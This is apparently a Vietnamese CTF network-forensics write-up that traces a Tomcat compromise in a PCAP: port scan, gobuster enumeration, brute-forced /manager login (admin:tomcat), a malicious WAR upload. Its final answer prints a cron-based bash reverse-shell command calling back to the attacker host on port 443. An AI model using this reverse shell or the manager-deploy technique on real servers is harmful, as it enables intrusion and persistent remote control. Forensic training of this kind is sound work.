---
title: '[Level-3]-Tomcat_Takeover'
date: 2026-03-18

---

# Lab Report - Tomcat Takeover
**DatHN5 - SO3 - FSAS**
---

Analyze network traffic using Wireshark's custom columns, filters, and statistics to identify suspicious web server administration access and potential compromise. 
**Category**: Network Forensics Tactics: Reconnaissance, Execution, Persistence, Privilege Escalation, Credential Access, Discovery, Command and Control 
**Tools**: Wireshark, NetworkMiner

## Scenario

The SOC team has identified suspicious activity on a web server within the company's intranet. To better understand the situation, they have captured network traffic for analysis. The PCAP file may contain evidence of malicious activities that led to the compromise of the Apache Tomcat web server. Your task is to analyze the PCAP file to understand the scope of the attack.

## Write up

Đội SOC phát hiện ra hành vi bất thường trên web server nội bộ, họ capture network traffic để phân tích sâu hơn. Ta sẽ phân tích file PCAP đó và từng bước giải mã bằng chứng dẫn tới việc Apache Tomcat web server bị tấn công.

### Q1: Given the suspicious activity detected on the web server, the PCAP file reveals a series of requests across various ports, indicating potential scanning behavior. Can you identify the source IP address responsible for initiating these requests on our server?


Để bắt đầu phân tích cuộc tấn công ta sẽ cần phải biết được điểm khởi đầu là gì, và ta sẽ bắt đầu bằng việc xác định ra địa chỉ IP đã khởi tạo các request tới server nội bộ của công ty. 
Trước hết mình xem kiểm tra xem có các endpoint nào bằng cách chọn `Statistics` -> `Endpoints` và xem thêm các endpoint nào đang giao tiếp với nhau `Statistics` -> `Conversations`

![image](https://hackmd.io/_uploads/rJPMuUHFbx.png)

![image](https://hackmd.io/_uploads/HkjWuIrtbx.png)

Qua hai thông tin trên mình biết được hiện tại đang có bốn endpoint và hai endpoint có lưu lượng giao tiếp nhiều nhất là `14.0.0.120` và `10.0.0.112` với gần 20.000 packets.

Do đó mình sẽ lọc các gói tin liên quan tới hai IP kia để tìm hiểu sâu hơn.

Khi lọc với điều kiện `ip.dst==10.0.0.112` mình thấy IP `14.0.0.120` đang gửi rất nhiều gói `SYN` để khởi tạo bắt tay ba bước
![image](https://hackmd.io/_uploads/B1HrsUSKZe.png)

Còn khi lọc với điều kiện `ip.src==10.0.0.112` thì mình thấy IP này đang trả rất nhiều gói `RST, ACK` cho IP `14.0.0.120`
![image](https://hackmd.io/_uploads/rJLcjUrY-e.png)

Điều này khẳng định rằng IP `14.0.0.120` đang scan port của IP `10.0.0.120` và kết quả thì hầu hết các port đều không mở bởi vì mình toàn thấy gói `[RST, ACK]`  chứ không phải là gói `[SYN, ACK]`

> Flag: 14.0.0.120

Bên cạnh đó mình có search xem những port nào mở thì thấy chỉ có port `8080` là port có chạy dịch vụ web được mở còn lại là các port thuộc dải cổng tạm thời phản hồi.
![image](https://hackmd.io/_uploads/S1M94vrFWx.png)


### Q2: Based on the identified IP address associated with the attacker, can you identify the country from which the attacker's activities originated?

Từ địa chỉ IP `14.0.0.120` mình tra cứu trên trang sau để lấy thông tin địa lý  {%preview https://www.geolocation.com/?ip=14.0.0.120#ipresult %}

Kết quả trả về IP này có địa điểm tại **China**
![image](https://hackmd.io/_uploads/H1VH0UHFZg.png)


### Q3: From the PCAP file, multiple open ports were detected as a result of the attacker's active scan. Which of these ports provides access to the web server admin panel?

Như kết quả đã có ở **Q1** thì chỉ có duy nhất port `8080` là chạy dịch vụ web được mở kết hợp với việc mình lọc `http` để xác nhận thêm thì có thể kết luận rằng port mà ta đang tim là `8080`

![image](https://hackmd.io/_uploads/HJSIywHY-x.png)
![image](https://hackmd.io/_uploads/H1MqJwBtbl.png)

> Flag: 8080

### Q4: Following the discovery of open ports on our server, it appears that the attacker attempted to enumerate and uncover directories and files on our web server. Which tools can you identify from the analysis that assisted the attacker in this enumeration process?

Mục tiêu là tìm ra tool mà attacker đã dùng để scan port. Để kiểm tra rõ hơn thì mình sẽ tìm tới các gói tin có liên quan tới IP máy tấn công để tìm hiểu thêm. 

Đầu tiên mình filter: `ip.src==14.0.0.120 && http` để tìm ra những gói tin gửi từ máy attacker tới web server, sau đó mình chọn ngẫu nhiên một gói tin, chọn Chuột phả -> Follow -> HTTP Stream thì thấy Header `User-Agent` không phải là thông tin mà một người dùng bình thường hay có như `Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/143.0.0.0 Safari/537.36` mà lại là `gobuster/3.6`
![image](https://hackmd.io/_uploads/HkEh5wStWe.png)

![image](https://hackmd.io/_uploads/H1U-svSFbx.png)

Để chắc chắn hơn mình lọc thêm với: `ip.dst==14.0.0.120 && http` để xem cách mà server phản hồi ra sao.
![image](https://hackmd.io/_uploads/r1QSjDSY-g.png)

Ở đây mình chọn phân tích hai gói tin một gói có status code là 200 một gói là 400 để xem có gì khacs biệt hay không. Kết quả cho thấy Header `User-Agent` luôn là `gobuster/3.6`
![image](https://hackmd.io/_uploads/SJuhYPBKbe.png)

![image](https://hackmd.io/_uploads/SyZV_wHKbl.png)

Từ đây mình kết luận rằng attacker sử dụng tool `gobuster` version 3.6 để thực hiện việc scan port

> Flag: gobuster

### Q5: After the effort to enumerate directories on our web server, the attacker made numerous requests to identify administrative interfaces. Which specific directory related to the admin panel did the attacker uncover?

Sau khi cố gắng dò các port trên web server và từng thư mục thì attacker đã phát hiện ra thư mục nào liên quan tới bảng điều khiển quản trị.

Để biết được attacker đã dò được những thư mục nào thì mình dùng bộ lọc `ip.src==14.0.0.120 && http`

Ban đầu mình kiểm tra thì thấy có hai directory liên quan tới admin là `/admin` và `/admin-console` nhưng lại không có thông tin gì khác nữa nên mình tìm kiếm tiếp
![image](https://hackmd.io/_uploads/HJKqyOSYZe.png)

Kết quả là mình thấy có directory `/manager` - thư mục mặc định của Apache Tomcat với các directory con lưu trữ các function mặc định như trong hình.
![image](https://hackmd.io/_uploads/rkHc0wrFWe.png)

Dò thêm thông tin mìn biết được rằng Apache Tomcat ở đây dùng version 7.0.88 
![image](https://hackmd.io/_uploads/S1qyXdBKWx.png)

Tra cứu thêm thông tin về Apache Tomcat version 7.0.88 thì mình biết được rằng attacker có thể tương tác với máy chủ thông qua các URL có cấu trúc: 
`http://{host}:{port}/manager/text/{command}?{parameters}`
![image](https://hackmd.io/_uploads/B1ajQOrtZx.png)

Trong đó 
- `/deploy`: Cho phép cài đặt một ứng dụng web mới lên máy chủ.
- Tệp  `.war`  **(Web Application Archive)**: là định dạng tệp mà attacker thường sử dụng. Nếu attacker có quyền truy cập vào giao diện này, chúng sẽ tải lên một tệp  `.war`  chứa  **Web Shell**  nhằm chiếm quyền điều khiển hoàn toàn máy chủ.

> Flag: /manager

### Q6: After accessing the admin panel, the attacker tried to brute-force the login credentials. Can you determine the correct username and password that the attacker successfully used for login?


![image](https://hackmd.io/_uploads/BJIZK_BFZl.png)

![image](https://hackmd.io/_uploads/B1KGtOHFbe.png)

![image](https://hackmd.io/_uploads/r1lEYdStZg.png)

![image](https://hackmd.io/_uploads/rJlrF_rKbg.png)

![image](https://hackmd.io/_uploads/SkxLt_BtWl.png)

![image](https://hackmd.io/_uploads/r1ewtdrtbe.png)

![image](https://hackmd.io/_uploads/HySOtdBY-x.png)

![image](https://hackmd.io/_uploads/SkXntdBK-x.png)

Để tìm thông tin đăng nhập thì mình có tra cứu các gói tin liên quan tới `/manager` thì thấy attacker đã thử mật khẩu vài lần trước khi đăng nhập thành công có thể thấy ở các hình trên và tài khoản chính xác nằm ở gói tin có Method POST `admin:tomcat`

> Flag: admin:tomcat


### Q7: Once inside the admin panel, the attacker attempted to upload a file with the intent of establishing a reverse shell. Can you identify the name of this malicious file from the captured data?

Để biết được attacker đã upload thông tin gì lên web server minht sẽ phân tích gói tin có method `POST`
Có hai cách để xem thông tin gì đac được upload lên là tìm tới metadata mục MIME đây là nơi lưu lại log những gì đã được truyền tải lên server. Và ở đây mình thu được kết quả là một file WAR đã được attacker upload lên web server. 

![image](https://hackmd.io/_uploads/SyAhqdBKZx.png)
![image](https://hackmd.io/_uploads/HJiSiOSFZe.png)

Theo như khoá PK thì file được upload lên là một file mã độc `zip` giả mạo file `WAR` 
![image](https://hackmd.io/_uploads/HJpHZFSYbl.png)

![image](https://hackmd.io/_uploads/ryPbGKBYbg.png)


> Flag: JXQOZY.war


### Q8: After successfully establishing a reverse shell on our server, the attacker aimed to ensure persistence on the compromised machine. From the analysis, can you determine the specific command they are scheduled to run to maintain their presence?


Sau khi đã tải malware webshell lên web server, attacker sẽ thực hiện tạo reverse shell để tiến hành quy trình duy trì kết nối persistance với máy nạn nhân. 

Quá trình bắt tay ba bước gồm:

1. Client (victim) gửi **SYN** tới Server (attacker)
2. Server gửi **SYN, ACK** tới Client
3. Client gửi **ACK** tới Server để bắt đầu kết nối

Thì trong trường hợp này attacker đã ép máy của nạn nhân kết nối tới máy họ, sau đó chèn vào trong cờ **SYN, ACK** đoạn mã giúp hắn duy trì kết nối với nạn nhân.

Ở đây mình lọc `ip.src==14.0.0.120 && tcp.flags.syn == 1 && tcp.flags.ack == 1` để tìm gói tin máy attacker gửi cờ **SYN, ACK** tới máy nạn nhân thì được kết quả như hình.

![image](https://hackmd.io/_uploads/rykeUKBKZx.png)

Trong đó khi mình xem xet TCP Stream gói `20647` thì thấy được rằng attacker đã chạy command `echo "* * * * * /bin/bash -c 'bash -i >& /dev/tcp/14.0.0.120/443 0>&1'" > cron` vào trong `cron` job để thực hiện tạo **reverse shell** kết nối tới IP `14.0.0.120` qua port `443` mỗi phút

![image](https://hackmd.io/_uploads/rkjOf_UKZg.png)

`crontab`  là nơi lưu trữ những câu lệnh được linux thực hiện tự động hàng ngày hoặc theo thời gian custom của người dùng.

Ta có thể kết luận command mà attacker đã chèn vào trong `crontab` là `/bin/bash -c 'bash -i >& /dev/tcp/14.0.0.120/443 0>&1'`

> Flag: /bin/bash -c 'bash -i >& /dev/tcp/14.0.0.120/443 0>&1'
> 